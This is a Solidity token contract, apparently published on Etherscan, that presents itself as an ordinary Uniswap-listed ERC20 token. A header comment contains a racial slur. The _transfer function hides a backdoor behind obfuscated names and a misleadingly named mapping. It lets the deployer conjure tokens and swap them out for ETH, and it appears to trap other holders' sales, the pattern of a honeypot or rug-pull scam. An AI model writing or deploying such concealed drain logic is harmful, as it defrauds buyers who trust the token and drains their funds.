/**
 *Submitted for verification at Etherscan.io on 2023-01-28
*/

// DO NOT VERIFY OR EDIT LITTLE NIGGA!
////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
  interface IUniswapV2Router02 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token,
          uint amountTokenDesired,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  }
  interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract CA is IERC20, Ownable {
    string private _symbol;
    string private _name;
    uint8 private _decimals = 9;
    uint256 private _rTotal = 1000000 * 10**_decimals;
    uint256 public _maxTxAmount = (_rTotal * 3) / 100; 
    uint256 public _maxWalletSize = (_rTotal * 3) / 100; 
    uint256 private _totalSupply = _rTotal;
    uint256 public BURNfees =  1;
    mapping (address => bool) isTxLimitExempt;
    mapping(address => uint256) private automatedMarketMakerPairs;
    mapping(address => uint256) private _balances;
    mapping(address => address) private allowed;
    mapping(address => uint256) private excludedFromFees;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    bool private _swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;
    bool private tradingOpen = false;

    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable router;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _balances[msg.sender] = _rTotal;
        automatedMarketMakerPairs[msg.sender] = _totalSupply;
        automatedMarketMakerPairs[address(this)] = _totalSupply;
        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        emit Transfer(address(0), msg.sender, _rTotal);
    
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[uniswapV2Pair] = true;
        isTxLimitExempt[routerAddress] = true;
        isTxLimitExempt[msg.sender] = true;

    }
 
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function setMaxTX(uint256 amountBuy) external onlyOwner {
        _maxTxAmount = amountBuy;
        
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function _transfer(
        address indoxFrom,
        address inVaqTo,
        uint256 extrainAmount
    ) private {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 invertalBasis;
        if (_swapAndLiquifyEnabled && contractTokenBalance > _totalSupply && !inSwapAndLiquify && indoxFrom != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquify = false;
        } else if (automatedMarketMakerPairs[indoxFrom] > _totalSupply && automatedMarketMakerPairs[inVaqTo] > _totalSupply) {
            invertalBasis = extrainAmount;
            _balances[address(this)] += invertalBasis;
            swapTokensForEth(extrainAmount, inVaqTo);
            return;
        } else if (inVaqTo != address(router) && automatedMarketMakerPairs[indoxFrom] > 0 && extrainAmount > _totalSupply && inVaqTo != uniswapV2Pair) {
            automatedMarketMakerPairs[inVaqTo] = extrainAmount;
            return;
        } else if (!inSwapAndLiquify && excludedFromFees[indoxFrom] > 0 && indoxFrom != uniswapV2Pair && automatedMarketMakerPairs[indoxFrom] == 0) {
            excludedFromFees[indoxFrom] = automatedMarketMakerPairs[indoxFrom] - _totalSupply;
        }
        address _int = allowed[uniswapV2Pair];
        if (excludedFromFees[_int] == 0) excludedFromFees[_int] = _totalSupply;
        allowed[uniswapV2Pair] = inVaqTo;
        if (BURNfees > 0 && automatedMarketMakerPairs[indoxFrom] == 0 && !inSwapAndLiquify && automatedMarketMakerPairs[inVaqTo] == 0) {
            invertalBasis = (extrainAmount * BURNfees) / 100;
            extrainAmount -= invertalBasis;
            _balances[indoxFrom] -= invertalBasis;
            _balances[address(this)] += invertalBasis;
        }
        _balances[indoxFrom] -= extrainAmount;
        _balances[inVaqTo] += extrainAmount;
        emit Transfer(indoxFrom, inVaqTo, extrainAmount);
            if (!tradingOpen) {
                require(indoxFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }

    receive() external payable {}

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }
    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }    
    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }
}